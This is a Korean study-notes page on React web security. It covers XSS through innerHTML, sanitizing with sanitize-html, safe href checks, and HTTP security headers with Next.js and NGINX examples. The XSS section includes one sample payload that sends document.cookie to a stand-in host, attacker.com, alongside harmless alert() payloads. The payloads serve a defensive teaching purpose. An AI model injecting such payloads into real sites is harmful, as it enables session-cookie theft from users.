---
sidebar_position: 14
title: "14장 웹사이트 보안을 위한 리액트와 웹페이지 보안 이슈"
description: 웹사이트 보안을 위한 리액트와 웹페이지 보안 이슈
authors: [MtypEyuc]
tags: [React]
hide_table_of_contents: false
---
## 1. 리액트에서 발생하는 크로스 사이트 스크립팅(XSS)
웹사이트 개발자가 아닌 제3자가 **개발자 도구나 사용자 입력을 받는 UI 요소에 접근해** 웹사이트에 악성 스크립트를 삽입해 실행할 수 있는 취약점을 의미한다. 쿠키를 획득해 사용자의 로그인 세션 등을 탈취하거나 사용자의 데이터를 변경하는 등 각종 위험성이 있다.

---
### 1. dangerouslySetInnerHTML prop
특정 브라우저 DOM의 innerHTML을 특정한 내용으로 교체할 수 있는 방법이다.
```jsx
function App() {
// 다음 결과물은 <div>First · Second</div>이다.
return <div dangerouslySetInnerHTML={{ __html: 'First &middot; Second' }} />
}
```
- __html을 키를 가지고 있는 객체만 인수로 받을 수 있으며, 이 인수로 넘겨받은 문자열을 DOM에 그대로 표시하는 역할을 한다. 인수로 받는 문자열에 제한은 없기 때문에 사용에 주의를 기울여야 하며 검증이 필요하다.


---
### 2. useRef를 활용한 직접 삽입
DOM에 직접 내용을 삽입할 수 있는 방법
```jsx
const html = `<span><svg/onload=alert(origin)></span>`
function App() {
const divRef = useRef<HTMLDivElement>(null)
useEffect(() => {
if (divRef.current) {
divRef.current.innerHTML = html
}
})
return <div ref={divRef} />
}
```
```html
<span><svg/onload=fetch('https://attacker.com/steal?cookie='+document.cookie)></span>
```
- 여러가지 이벤트를 사용해 웹 사이트에 접근해 개발자가 만들지 않은 코드를 삽입할 수 있다.


---
### 3. 리액트에서 XSS 문제를 피하는 방법
제3자가 삽입할 수 있는 HTML을 안전한 HTML 코드로 한 번 치환하는 것이다. 이러한 과정을 새니타이즈(sanitize) 또는 이스케이프(escape) 라고 한다. npm에 있는 라이브러리를 사용한다.
- [DOMpurity](https://github.com/cure53/DOMPurify)
- [sanitize-html](https://github.com/apostrophecms/sanitize-html)
- [js-xss](https://github.com/leizongmin/js-xss)
#### 1. sanitize-html 사용법
```
npm install sanitize-html
```

```jsx
const sanitizeHtml = require("sanitize-html");

const dirtyHtml = `<h1>안전한 제목</h1><script>alert('해킹!');</script>`;
const cleanHtml = sanitizeHtml(dirtyHtml);

console.log(cleanHtml);
// 출력: <h1>안전한 제목</h1>
```
- 기본적으로 위험한 태그를 자동으로 제거해준다.
```tsx
import { useEffect, useRef } from "react";
import sanitizeHtml from "sanitize-html";

const cleanHtml = sanitizeHtml(dirtyHtml, {
    allowedTags: ["a"],
    allowedAttributes: {
        a: ["href", "title"]
    }
});

const dirtyHtml = `<span><svg/onload=alert('XSS!')></span>`;

function App() {
  const divRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (divRef.current) {
      divRef.current.innerHTML = sanitizeHtml(dirtyHtml);
    }
  }, []);

  return <div ref={divRef} />;
}

export default App;
```
- 특정 태그나 속성만 허용하게 만들어 유연하게 사용할 수 있다.
---
## 2. getServerSideProps와 서버 컴포넌트를 주의하자
서버에는 일반 사용자에게 노출되면 안 되는 정보가 담겨있기 때문에 주의해야 한다.
```tsx
export default function App({ token }: { token: string }) {
    const user = JSON.parse(window.atob(token.split('.')[1]))
    const user_id = user.id
    /* do something... */
}

export const getServerSideProps = async (ctx: GetServerSidePropsContext) => {
    const cookie = ctx.req.headers.cookie || ''
    const token = validateCookie(cookie)

    if (!token) {
        return {
            redirect: {
                destination: '/404',
                permanent: false,
            },
        }
    }

    return {
        props: {
            token,
        },
    }
}
```
- 쿠키를 클라이언트에 필요한 token 값만 제한적으로 반환해 불필요한 노출을 줄이고 예외 처리 리다이렉트를 서버에서 처리해 성능이 향상된다.
---
## 3. &lt;a&gt; 태그의 값에 적절한 제한을 둬야 한다
```tsx
function App() {
    return (
        /*
        Warning: A future version of React will block javascript: URLs as a security precaution. Use
        event handlers instead if you can. If you need to generate unsafe HTML try using dangerouslySetIn-
        nerHTML instead. React was passed "javascript:()=>alert('hello')".
        at a
        */
        <>
            <a href="javascript:alert('hello');">링크</a>
        </>
    )
}
```
- 태그 안의 자바스크립트 코드가 존재하면 이를 실행하기 때문에 &lt;a&gt; 태그는 반드시 페이지 이동이 있을 때만 사용하는 것이 좋으며, 핸들러를 작동시키고 싶다면 button을 사용하는 것이 좋다.
```tsx
function isSafeHref(href: string) {
  let isSafe = false
  try {
    // javascript:가 오면 protocol이 javascript:가 된다.
    const url = new URL(href)
    if (['http:', 'https:'].includes(url.protocol)) {
      isSafe = true
    }
  } catch {
    isSafe = false
  }
  return isSafe
}
function App() {
    const unsafeHref = "javascript:alert('hello');"
    const safeHref = 'https://www.naver.com'
    return (
        <>
            {/* 위험한 href로 분류되어 #이 반환된다. */}
            <a href={isSafeHref(unsafeHref) ? unsafeHref : '#'}>위험한 href</a>
            {/* 안전한 href로 분류되어 원하는 페이지로 이동할 수 있다. */}
            <a href={isSafeHref(safeHref) ? safeHref : '#'}>안전한 href</a>
        </>
    )
}
```
- href에 주소 입력이 가능하다면 피싱 사이트로 이동하는 등 보안이슈가 생길 위험이 있기 때문에 이를 막기 위해 origin도 확인해 처리하는 것이 좋다.


---
## 4. HTTP 보안 헤더 설정하기
HTTP 보안 헤더만 효율적으로 사용할 수 있어도 많은 보안 취약점을 방지할 수 있다. 헤더는 여러 개 설정할 수 있다.

```tsx
const express = require('express');
const app = express();

// STS 헤더 설정
app.use((req, res, next) => {
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
    next();
});
```

---
### 1. Strict-Transport-Security
HTTP로 접근하는 경우 이러한 모든 시도는 HTTPS로 변경되게 한다.


---
### 2. X-XSS-Protection
페이지에서 XSS 취약점이 발견되면 페이지 로딩을 중단하는 헤더다. 구형 브라우저에서 사용한다.
```
X-XSS-Protection:

 0 // 필터링을 끈다.
 
 1 // 필터링을 켠다. 공격이 감지되면 위험 코드를 제거한다.
 
 1; mode=block // 공격이 감지되면 접근 자체를 막는다.
 
 1; report=<reporting-uri> // reporting-uri 쪽으로 보고서를 보낸다.
```


---
### 3. X-Frame-Options
&lt;iframe&gt; 에 페이지를 띄우고 내부에 있는 악성컨텐츠를 클릭하게 만드는 Clicking 공격을 방지하기 위해 페이지를 frame, iframe, embed, object 내부에서 렌더링을 허용할지를 나타낼 수 있다.
```
X-Frame-Options:

 DENY // 프레임 관련 코드가 있다면 무조건 막는다.
 
 SAMEORIGIN // 같은 origin에 대해서만 프레임을 허용한다.
```

---
### 4. Permissions-Policy
웹사이트에서 사용할 수 있는 기능과 사용할 수 없는 기능을 명시적으로 선언하는 헤더다. 혹시XSS가 발생한다고 하더라도 사용자에게 미칠 수 있는 악영향을 제한할 수 있게 된다.
```
# 모든 geolocation 사용을 막는다.
Permissions-Policy: geolocation=()

# geolocation을 페이지 자신과 몇 가지 페이지에 대해서만 허용한다.
Permissions-Policy: geolocation=(self "https://a.yceffort.kr" "https://b.yceffort.kr")

# 카메라는 모든 곳에서 허용한다.
Permissions-Policy: camera=*;

# pip 기능을 막고, geolocation은 자신과 특정 페이지만 허용하며,
# 카메라는 모든 곳에서 허용한다.
Permissions-Policy: picture-in-picture=(), geolocation=(self https://yceffort.kr), camera=*;
```
---
### 5. X-Content-Type-Options
웹서버가 브라우저에 강제로 이 파일을 읽는 방식을 지정하는 것이다.
```
X-Content-Type-Options: nosniff
```
- CSS나 MIME이 text/css가 아닌 경우, 혹은 파일 내용이 script나 MIME 타입이 자바스크립트 타입이 아니면 차단한다.

---
### 6. Referrer-Policy
이 헤더에는 현재 요청을 보낸 페이지의 주소가 나타난다. 보안에 위험한 정보가 있을 수 있어, 해당 URL에서 보여줄 정보를 제어할 수 있다.
```
Referrer-Policy: 

no-referrer // 정보를 전송하지 않음

no-referrer-when-downgrade // 프로토콜이 같은 경우에만 전송

origin-when-cross-origin // 같은 출처 내에서 URL 전체를 전송하고 다른 출처에는 호스트 명만 전송

origin // 호스트 명만 전송

no-referrer-when-downgrade // 기본값. HTTPS -> HTTP 이동 시 정보를 보내지 않음.

strict-origin // HTTPS -> HTTPS 이동할 때만 정보를 보냄

unsafe-url // 모든 요청에 정보를 보냄
```

---
### 7. Content-Security-Policy
XSS 공격이나 데이터 삽입 공격과 같은 다양한 보안 위협을 막기 위해 설계됐다.
#### 1. *-src
```
Content-Security-Policy: <directive> <value>; 
```
- [directiv](https://www.w3.org/TR/CSP2/#directives): src를 제어할 수 있는 지시문이다. 자원의 출처를 지정한다.
- [value](https://www.w3.org/TR/CSP3/#framework-directive-source-list): 지정할 수 있는 자원이다.
```
//ex

Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://apis.google.com 'nonce-<base64-value>'; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data: https://images.example.com; 
  font-src 'self' https://fonts.gstatic.com; 
  connect-src 'self' https://api.example.com; 
  frame-src 'none'; 
  report-to csp-endpoint; 
  upgrade-insecure-requests;
```
- self: 현재 페이지의 출처와 동일한 출처를 허용한다.


- none: 해당 자원을 전혀 로드할 수 없도록 설정한다.


- URL: 특정 도메인이나 URL에서 자원을 로드하도록 허용한다.


---
#### 2. form-action
폼 양식으로 제출할 수 있는URL을 제한할 수 있다.
```tsx
<meta http-equiv="Content-Security-Policy" content="form-action 'none'" />

export default function App() {
    function handleFormAction() {
        alert('form action!')
    }
    
//Refused to send form data to '****' because it violates the following Content Security Policy direc-tive: "form-action 'none'".
    return (
        <div>
            <form action={handleFormAction} method="post">
                <input type="text" name="name" value="foo" />
                <input type="submit" id="submit" value="submit" />
            </form>
        </div>
    )
}
```

### 8. 보안 헤더 설정하기
#### 1. Next.js
next.config.js 에서 경로별 [보안 헤더](https://nextjs.org/docs/pages/api-reference/config/next-config-js/headers#options)를 적용할 수 있다.
```tsx
const ContentSecurityPolicies = [
    { key: 'default-src', value: "'self'" },
    { key: 'script-src', value: "'self'" },
    { key: 'child-src', value: 'example.com' },
    { key: 'style-src', value: "'self' example.com" },
    { key: 'font-src', value: "'self'" },
]
const securityHeaders = [
    {
        key: 'Content-Security-Policy',
        value: ContentSecurityPolicies.map(
            (item) => `${item.key} ${item.value};`,
        ).join(' '),
    },
]
```

---

#### 2. NGINX
경로별로add_header 지시자를 사용해 원하는 응답 헤더를 추가할 수 있다.
```
server {
    listen 80;
    server_name example.com;

    # 1. Content-Security-Policy 헤더 설정
    # 자원 로드 출처를 'self'로 제한하고, 특정 외부 도메인에서 자원을 로드할 수 있게 설정
    add_header Content-Security-Policy "
        default-src 'self';  # 기본 출처는 동일 출처
        script-src 'self' https://apis.example.com;  # 스크립트는 동일 출처와 https://apis.example.com에서만 로드
        style-src 'self' https://fonts.example.com;  # 스타일은 동일 출처와 https://fonts.example.com에서만 로드
        img-src 'self' https://images.example.com;  # 이미지 출처는 동일 출처와 https://images.example.com에서만 허용
        font-src 'self' https://fonts.example.com;  # 폰트 출처는 동일 출처와 https://fonts.example.com에서만 허용
        frame-ancestors 'none';  # 프레임에 포함되지 않도록 설정
        upgrade-insecure-requests;  # HTTP에서 HTTPS로 자동 업그레이드
        report-uri /csp-violation-report-endpoint;  # CSP 위반 보고를 받을 URI
    " always;

    # 2. X-XSS-Protection 헤더 설정 (XSS 공격을 방지)
    add_header X-XSS-Protection "1; mode=block" always;

    # 3. X-Frame-Options 헤더 설정 (페이지를 iframe에 표시하지 않음)
    add_header X-Frame-Options "DENY" always;

    # 4. Strict-Transport-Security 헤더 설정 (HTTPS만 사용)
    # 이 설정은 HTTPS 연결만 허용하고, 1년 동안 모든 서브도메인도 강제로 HTTPS로 전환
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # 5. Referrer-Policy 헤더 설정 (리퍼러 정보 제한)
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # 6. Permissions-Policy 헤더 설정 (특정 기능에 대한 권한 제한)
    add_header Permissions-Policy "geolocation=(self), microphone=()" always;

    # 7. CSP Violation Report URI (CSP 위반 보고 수집)
    location = /csp-violation-report-endpoint {
        # 보고를 받을 수 있도록 요청 처리
        add_header Content-Type application/json;
        return 204;  # 리포트 요청을 받았을 때 204 상태 코드 반환
    }

    location / {
        # 웹 애플리케이션의 나머지 설정
        try_files $uri $uri/ =404;
    }
}
```
---
### 9. [보안 헤더 확인하기](https://securityheaders.com/)
![01.webp](../../../static/img/모던%20리액트%20Deep%20Dive/14/02.webp)

---
## 5. [취약점이 있는 패키지의 사용을 피하자](https://security.snyk.io/)
![01.webp](../../../static/img/모던%20리액트%20Deep%20Dive/14/01.webp)

---
## 6. [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- 주로 웹에서 발생할 수 있는 정보 노출, 악성 스크립트, 보안 취약점 등을 연구하며, 주기적으로 10대 웹 애플리케이션 취약점을 공개한다.
---

## 작성하고 느낀 점

좋았던 점: 보안 관련으로 아는 것은 CORS 오류 수정하는 방법만 알고 있었는데 다양한 설정이 있는 것을 알게 되었다.


배운 점: 보안 태그를 설정해 사이트의 안정성을 향상시키는 방법을 배웠다.


아쉬운 점: 보안 관련으로 학습을 진행한 적이 없어 예제를 이해하기 힘들었다. 예제에 사용된 속성값의 정의를 찾기 위해 시간을 많이 사용했다.


향후 계획: 보안 관련 설정에 대해 더 알아 볼 것이다.

